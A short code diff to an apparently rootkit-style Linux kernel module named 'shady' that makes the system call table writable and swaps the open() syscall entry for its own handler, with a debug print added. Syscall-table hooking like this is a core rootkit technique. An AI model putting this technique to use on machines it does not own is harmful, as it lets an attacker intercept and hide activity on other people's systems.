@@ -248,8 +248,9 @@ shady_init_module(void)
     set_addr_rw(system_call_table_address);
     
     // save old open position
-    old_open = &sys_call_table_address[__NR_open];
-    &sys_call_table_address[__NR_open] = my_open;
+    printk(KERN_DEBUG "TESTING\n");
+    old_open = system_call_table_address[__NR_open];
+    system_call_table_address[__NR_open] = my_open;
     
 
   /* Get a range of minor numbers (starting with 0) to work with */
